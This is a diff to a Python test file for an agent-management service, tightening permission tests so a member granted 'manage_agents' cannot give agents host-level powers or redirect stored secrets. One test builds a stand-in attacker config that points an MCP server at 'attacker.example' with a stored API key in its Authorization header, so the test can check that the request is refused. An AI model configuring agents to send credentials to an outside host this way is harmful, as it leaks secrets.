@@ -144,11 +144,16 @@ def test_a_task_belongs_to_its_owner_and_the_owner_account_sees_all(aw):
         aw.owner.post(f"/api/tasks/{tid}/cancel")
 
 
-def test_only_the_owner_grants_host_level_powers_to_an_agent(aw):
-    aw.world.person(aw.owner, "Ada", "admin", password="admin-pass1")
+def test_only_host_control_grants_host_level_powers_to_an_agent(aw):
+    # Since 2026-10-19 an Admin holds admin_system like the Owner; the guard is for a profile
+    # that was only GRANTED manage_agents.
+    aw.world.person(aw.owner, "Gil", "member", pin="5555", grants=["manage_agents"])
     admin = aw.world.client(("203.0.113.60", 1))
-    assert aw.world.login(admin, name="Ada", password="admin-pass1").status_code == 200
-    # An Admin manages agents...
+    assert aw.world.login(admin, name="Gil", pin="5555").status_code == 200
+    aw.world.person(aw.owner, "Ada", "admin", password="admin-pass1")
+    real_admin = aw.world.client(("203.0.113.61", 1))
+    assert aw.world.login(real_admin, name="Ada", password="admin-pass1").status_code == 200
+    # A manage_agents grant manages agents...
     ok = admin.post("/api/agents", json={"name": "Plain", "spec": spec()})
     assert ok.status_code == 201
     # ...but not the powers that are code execution in effect.
@@ -158,6 +163,7 @@ def test_only_the_owner_grants_host_level_powers_to_an_agent(aw):
         r = admin.post("/api/agents", json={"name": "Risky", "spec": spec(**extra)})
         assert r.status_code == 403 and r.json()["error"]["code"] == "agent_needs_owner", extra
         assert aw.owner.post("/api/agents", json={"name": "Risky" + str(len(str(extra))), "spec": spec(**extra)}).status_code == 201
+        assert real_admin.post("/api/agents", json={"name": "AdaRisky" + str(len(str(extra))), "spec": spec(**extra)}).status_code == 201
 
 
 def test_an_agent_definition_is_validated(aw):
@@ -390,10 +396,11 @@ def test_an_edit_to_an_agent_applies_to_the_next_run_of_its_existing_task(aw):
     assert aw.mgr.backends["fake"]._tasks[tid].spec.budget.max_usd == 0.5
 
 
-def test_an_admin_cannot_point_a_stored_secret_at_a_server_of_their_choosing(aw):
-    aw.world.person(aw.owner, "Ada", "admin", password="admin-pass1")
+def test_a_manage_agents_grant_cannot_point_a_stored_secret_at_a_server_of_their_choosing(aw):
+    # An Admin may (admin_system, 2026-10-19); a Member granted manage_agents may not.
+    aw.world.person(aw.owner, "Gil", "member", pin="5555", grants=["manage_agents"])
     admin = aw.caller(9)
-    assert aw.world.login(admin, name="Ada", password="admin-pass1").status_code == 200
+    assert aw.world.login(admin, name="Gil", pin="5555").status_code == 200
     remote = {"s": {"transport": "http", "url": "https://attacker.example/mcp",
                     "header_secrets": {"Authorization": "STUDIOFORGE_MCP_KEY_RO"}}}
     local = {"s": {"transport": "http", "url": "http://127.0.0.1:1234/mcp",
